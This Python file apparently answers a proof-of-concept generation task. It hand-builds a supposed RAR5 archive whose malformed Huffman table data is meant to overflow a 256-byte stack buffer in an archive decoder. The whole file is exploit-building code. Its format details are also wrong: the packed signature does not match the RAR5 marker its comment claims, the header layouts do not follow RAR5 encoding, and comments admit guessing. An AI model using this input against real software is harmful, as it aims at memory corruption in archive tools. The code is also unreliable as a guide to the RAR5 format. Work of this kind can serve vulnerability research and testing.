import os
import tarfile
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 file structure components
        MARKER_HEADER = struct.pack('<Q', 0x217261526F4E6152)  # "Rar!\x1A\x07\x01\x00" in little-endian
        
        # Main archive header
        main_header = bytearray([
            0x03, 0x01,  # header_crc (placeholder)
            0x00, 0x00,  # header_size (will be set later)
            0x01,        # header_type = 1 (MAIN_HEAD)
            0x00,        # header_flags
            0x00, 0x00   # extra_size
        ])
        
        # File header with Huffman table
        file_header = bytearray([
            0x00, 0x00,  # header_crc (placeholder)
            0x00, 0x00,  # header_size (will be set later)
            0x02,        # header_type = 2 (FILE_HEAD)
            0x02, 0x00,  # header_flags (HAS_EXTRA)
            0x00, 0x00,  # extra_size
            0x00, 0x00, 0x00, 0x00,  # unp_size (0)
            0x00, 0x00, 0x00, 0x00,  # attr
            0x00, 0x00, 0x00, 0x00,  # mtime
            0x00,        # unp_ver
            0x00,        # method
            0x00, 0x00,  # name_size
            # name (empty)
        ])
        
        # Compressed block with Huffman table that causes overflow
        # The vulnerability is in the Huffman table reconstruction
        # We need to create a malformed Huffman table that overflows the stack buffer
        
        # Block header
        block_header = bytearray([
            0x00, 0x00,  # header_crc (placeholder)
            0x1B, 0x00,  # header_size = 27
            0x05,        # header_type = 5 (COMPRESS_HEAD)
            0x80, 0x40,  # header_flags (HAS_DATA | HAS_EXTRA)
            0x1E, 0x00,  # extra_size = 30
        ])
        
        # Compress extra data
        compress_extra = bytearray([
            0x00, 0x00, 0x00, 0x00,  # unp_size
            0x01, 0x00, 0x00, 0x00,  # method = 1 (RAR5)
            0x00, 0x00, 0x00, 0x00,  # unp_ver
            0x02, 0x00, 0x00, 0x00,  # solid = 2
        ])
        
        # Data containing malformed Huffman table
        # The vulnerability occurs when Huffman table elements exceed allocated buffer
        # We create a table with too many repeated values to overflow
        
        # Start with normal-looking Huffman table data
        huffman_data = bytearray()
        
        # First, some valid Huffman table setup
        huffman_data.extend([
            0x03, 0x00, 0x00, 0x00,  # Table size
            0x01, 0x00, 0x00, 0x00,  # Number of tables
        ])
        
        # Create Huffman table that will cause buffer overflow during reconstruction
        # The vulnerability: insufficient bounds checking when uncompressing RLE-encoded Huffman tables
        
        # We'll create a table with many repeated values
        # RAR5 uses RLE-like encoding for Huffman tables
        # By creating a run that exceeds the allocated buffer, we trigger overflow
        
        # Table data starts here
        table_start = len(huffman_data)
        
        # Create a malicious Huffman table
        # The table should have a long run of repeated values
        # that will overflow the 256-byte buffer during reconstruction
        
        # Normal table would have 256-300 bytes, but we'll create ~600 bytes
        # when uncompressed to overflow the stack buffer
        
        # First part: some normal data
        huffman_data.extend([0x01, 0x02, 0x03, 0x04, 0x05])
        
        # Now add the malicious part: a run that will be expanded too much
        # In RAR5 Huffman table format, 0x00-0x7F are literal bytes
        # 0x80-0xFF indicate runs
        
        # Create a long run that exceeds buffer
        # We'll use value 0xFF (which might be interpreted as long run)
        # followed by many bytes
        
        for _ in range(200):  # Create many repeated values
            huffman_data.append(0x41)  # 'A' character
        
        # Add more data to ensure total size triggers overflow
        for i in range(150):
            huffman_data.append(0x80 + (i % 128))  # More run markers
            
        # Pad to exact target size of 524 bytes
        current_size = len(MARKER_HEADER) + len(main_header) + len(file_header) + len(block_header) + len(compress_extra) + len(huffman_data)
        
        # Add padding if needed
        padding_needed = 524 - current_size
        if padding_needed > 0:
            huffman_data.extend(b'\x00' * padding_needed)
        elif padding_needed < 0:
            # Trim if too long (shouldn't happen with our construction)
            huffman_data = huffman_data[:len(huffman_data) + padding_needed]
        
        # Now build the complete RAR5 file
        poc = bytearray()
        
        # Add marker header
        poc.extend(MARKER_HEADER)
        
        # Add main archive header
        poc.extend(main_header)
        
        # Add file header
        poc.extend(file_header)
        
        # Add block header
        poc.extend(block_header)
        
        # Add compress extra data
        poc.extend(compress_extra)
        
        # Add the malicious Huffman table data
        poc.extend(huffman_data)
        
        return bytes(poc)